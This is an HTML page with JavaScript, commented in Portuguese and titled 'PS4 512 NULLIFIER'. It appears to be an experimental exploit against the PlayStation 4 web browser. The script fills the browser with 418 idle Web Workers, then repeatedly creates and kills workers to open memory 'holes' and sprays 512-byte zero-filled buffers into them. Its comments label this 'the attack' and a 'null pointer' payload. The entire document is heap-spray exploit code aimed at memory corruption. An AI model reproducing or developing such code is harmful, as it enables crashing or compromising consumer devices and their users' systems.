<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 512 NULLIFIER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        #counter { font-size: 6em; font-weight: bold; margin: 10px 0; color: #00f; text-shadow: 0 0 10px #00f; }
        #status { font-size: 1.5em; border: 1px solid #fff; padding: 10px; margin-bottom: 20px;}
        .stabilized { color: #0f0 !important; border-color: #0f0 !important; }
        .attack { background-color: #fff !important; color: #000 !important; }
    </style>
</head>
<body>

    <h1>512 BYTE NULLIFIER</h1>
    <div id="status">ENCHENDO TABELA...</div>
    <div id="counter">0</div>

    <script>
        // CONFIGURAÇÃO DESCOBERTA
        const TARGET_LIMIT = 418;  
        const WAIT_TIME = 4000;
        const SPRAY_SIZE = 512; // O "Número Mágico" que você descobriu
        
        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // PAYLOAD DE ZEROS (NULL POINTER)
        // Se 0x41 estabilizou, 0x00 deve matar instantaneamente.
        const fakeStruct = new Uint8Array(SPRAY_SIZE);
        fakeStruct.fill(0x00); 

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        // FASE 1: Enchimento
        function start() {
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    updateDisplay();
                    waitAndSpray();
                    return;
                }
                updateDisplay();
            }, 40);
        }

        // FASE 2: Estabilização
        function waitAndSpray() {
            const st = document.getElementById('status');
            st.className = "stabilized";
            st.innerText = `ALVO 418. INJETANDO NULL BYTES...`;
            
            setTimeout(() => {
                performAttack();
            }, WAIT_TIME);
        }

        function performAttack() {
            const st = document.getElementById('status');
            st.className = "attack";
            st.innerText = ">>> NULLIFYING MEMORY <<<";

            // O ATAQUE
            setInterval(() => {
                // 1. Cria buraco
                const w = new Worker(killerUrl);
                w.terminate();
                
                // 2. Preenche buraco com ZEROS
                try {
                    if(workers.length > 0) {
                        workers[0].postMessage(fakeStruct);
                    }
                } catch(e){}
                
            }, 10);
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
